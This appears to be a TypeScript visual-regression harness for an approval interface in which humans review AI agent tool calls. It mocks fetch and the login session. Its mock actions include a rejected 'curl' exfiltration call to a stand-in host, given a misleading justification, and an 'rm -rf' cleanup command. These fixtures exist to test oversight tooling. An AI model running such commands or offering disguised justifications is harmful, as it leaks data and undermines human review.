// Visual regression test harness for airlock frontend
// Mounts App.svelte end-to-end with mocked fetch and a pre-seeded OIDC session.

import "../../app.css";
import { mount } from "svelte";
import App from "../../App.svelte";
import HarnessIndex from "./HarnessIndex.svelte";
import type { Action, BackendStatus, OAuthProviderStatus } from "../../types.ts";

// ── Mock data ────────────────────────────────────────────────────────────────

const PENDING_BASH: Action = {
  key: { session_key: "session-abc-123", action_seq: 1 },
  created_at: "2025-01-15T10:30:00Z",
  updated_at: "2025-01-15T10:30:00Z",
  call: { server_namespace: "runtime", tool_name: "bash", arguments: { argv: ["rm", "-rf", "/tmp/test"] } },
  justification: "Clean up test directory after running integration tests",
  state: { status: "pending" },
};

const PENDING_PYTHON: Action = {
  key: { session_key: "session-def-456", action_seq: 1 },
  created_at: "2025-01-15T10:35:00Z",
  updated_at: "2025-01-15T10:35:00Z",
  call: { server_namespace: "runtime", tool_name: "python_exec", arguments: { code: 'print("hello world")' } },
  justification: "Debug output for tracing pipeline state",
  state: { status: "pending" },
};

const DONE_SUCCEEDED: Action = {
  key: { session_key: "session-ghi-789", action_seq: 1 },
  created_at: "2025-01-15T09:00:00Z",
  updated_at: "2025-01-15T09:01:30Z",
  call: { server_namespace: "runtime", tool_name: "bash", arguments: { argv: ["ls", "-la", "/home"] } },
  justification: "List home directory contents for debugging",
  state: {
    status: "done",
    outcome: {
      content: [
        {
          type: "text",
          text: "total 8\ndrwxr-xr-x 3 user user 4096 Jan 15 09:00 .\ndrwxr-xr-x 20 root root 4096 Jan 15 08:00 ..",
        },
      ],
      isError: false,
    },
  },
};

const REJECTED: Action = {
  key: { session_key: "session-jkl-012", action_seq: 1 },
  created_at: "2025-01-15T08:00:00Z",
  updated_at: "2025-01-15T08:05:00Z",
  call: {
    server_namespace: "runtime",
    tool_name: "bash",
    arguments: { argv: ["curl", "-s", "http://evil.example.com/exfil"] },
  },
  justification: "Fetch external resource for processing",
  state: { status: "rejected", reason: "Suspicious external network request" },
};

const BACKENDS: BackendStatus[] = [
  { name: "exec", connection_status: { state: "connected" } },
  {
    name: "files",
    connection_status: { state: "degraded", error: "Connection refused", since: "2025-01-15T10:00:00Z" },
  },
];

const OAUTH_PROVIDERS: OAuthProviderStatus[] = [
  {
    name: "google",
    display_name: "Google",
    provider_type: "oauth2",
    status: { state: "connected", expires_at: "2025-01-16T10:30:00Z", scope: "email profile" },
  },
  {
    name: "plaid",
    display_name: "Plaid",
    provider_type: "plaid",
    status: { state: "disconnected" },
  },
];

// ── Pages ────────────────────────────────────────────────────────────────────

const pages: Record<string, { hash: string }> = {
  ListPage: { hash: "#/" },
  DetailPage: { hash: "#/sessions/session-abc-123/actions/1" },
  BackendsPage: { hash: "#/backends" },
  OAuthPage: { hash: "#/oauth" },
};

// ── Bootstrap ────────────────────────────────────────────────────────────────

const params = new URLSearchParams(window.location.search);
const pageName = params.get("page");
const appEl = document.getElementById("app")!;
const page = pageName ? pages[pageName] : null;

if (page) {
  // Pre-seed OIDC session in sessionStorage so auth.ts skips the login redirect.
  // oidc-client-ts reads the user under key "oidc.user:{authority}:{client_id}".
  const MOCK_AUTHORITY = "https://mock-auth";
  const MOCK_CLIENT_ID = "mock-client";
  sessionStorage.setItem(
    `oidc.user:${MOCK_AUTHORITY}:${MOCK_CLIENT_ID}`,
    JSON.stringify({
      id_token: "mock-id-token",
      access_token: "mock-access-token",
      token_type: "Bearer",
      scope: "openid decide read",
      profile: {
        iss: MOCK_AUTHORITY,
        sub: "mock-user",
        aud: MOCK_CLIENT_ID,
        exp: 9999999999,
        iat: 1700000000,
      },
      expires_at: 9999999999,
    })
  );

  // Mock window.fetch to serve all API and auth calls locally.
  window.fetch = async (input: RequestInfo | URL, _init?: RequestInit): Promise<Response> => {
    const url = typeof input === "string" ? input : input instanceof URL ? input.href : (input as Request).url;
    // Strip query string to get the pathname for routing.
    const pathname = url.startsWith("/") ? url.replace(/\?.*$/, "") : new URL(url).pathname;

    const json = (data: unknown): Response =>
      new Response(JSON.stringify(data), {
        status: 200,
        headers: { "Content-Type": "application/json" },
      });

    if (pathname === "/auth/config") {
      return json({ authority: MOCK_AUTHORITY, client_id: MOCK_CLIENT_ID, redirect_uri: "http://localhost/" });
    }
    if (pathname === "/api/events") {
      // Never-ending SSE stream — keeps the client connected without firing events.
      return new Response(new ReadableStream({ start() {} }), {
        status: 200,
        headers: { "Content-Type": "text/event-stream" },
      });
    }
    if (pathname === "/api/actions") {
      const qs = url.includes("?") ? url.split("?")[1] : "";
      if (new URLSearchParams(qs).get("status") === "pending") {
        return json([PENDING_BASH, PENDING_PYTHON]);
      }
      return json([DONE_SUCCEEDED, REJECTED]);
    }
    if (/^\/api\/actions\/[^/]+\/\d+$/.test(pathname)) {
      return json(PENDING_BASH);
    }
    if (pathname === "/api/backends") {
      return json(BACKENDS);
    }
    if (pathname === "/api/oauth/providers") {
      return json(OAUTH_PROVIDERS);
    }
    // Anything else (e.g. fonts loaded from CSS): let it through.
    throw new Error(`Unmocked fetch: ${url}`);
  };

  // Set the hash before mounting so App.svelte's parseRoute() sees the right route.
  window.location.hash = page.hash;

  mount(App, { target: appEl });
} else {
  mount(HarnessIndex, { target: appEl, props: { pages: Object.keys(pages), error: pageName } });
}
